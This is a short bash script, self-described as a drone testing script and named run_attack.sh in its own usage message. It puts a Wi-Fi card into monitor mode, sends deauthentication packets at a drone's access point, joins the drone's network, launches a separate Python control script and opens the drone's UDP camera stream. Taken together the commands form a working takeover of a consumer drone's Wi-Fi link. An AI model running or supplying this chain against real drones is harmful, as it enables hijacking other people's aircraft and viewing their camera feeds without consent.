#!/bin/bash


# Drone Testing Script Bash + Python Intgration


#Drone Data ENV

INTERFACE="wlan0"
DRONE_BSSID="AA:LL:II:11:22:22" #Change to Drone MAC
DRONE_SSID="DJali-123456"       #Change_SSID Drone
DRONE_PASS=""                   #Drone wifi pass if need
PORT="11111"                    #Camer Streem Port 11111


echo "Starting"

if [ "$EUID" -ne 0 ]; then
  echo "[-] Please run as root (sudo ./run_attack.sh)"
  exit 1
fi

#Monitor Mode & Deauth
echo "Enable Monitor mode"
airmon-ng start $INTERFACE
MON_IFACE="${INTERFACE}mon"

echo "Sending Deauth packets"
aireplay-ng --deauth 10 -a $DRONE_BSSID $MON_IFACE

echo "Monitor mode Stop"
airmon-ng stop $MON_IFACE

#Connect to Wi-Fi
echo "Connect to Drone Wi-Fi"
if [ -z "$DRONE_PASS" ]; then
    nmcli dev wifi connect "$DRONE_SSID" ifname $INTERFACE
else
    nmcli dev wifi connect "$DRONE_SSID" password "$DRONE_PASS" ifname $INTERFACE
fi

sleep 3


echo "exec Python Control in background"
python3 control.py &
sleep 2


echo "LaunchCamera Stream on port $PORT"
ffplay -fflags nobuffer -flags low_delay -framedrop -probesize 32 "udp://@:$PORT"
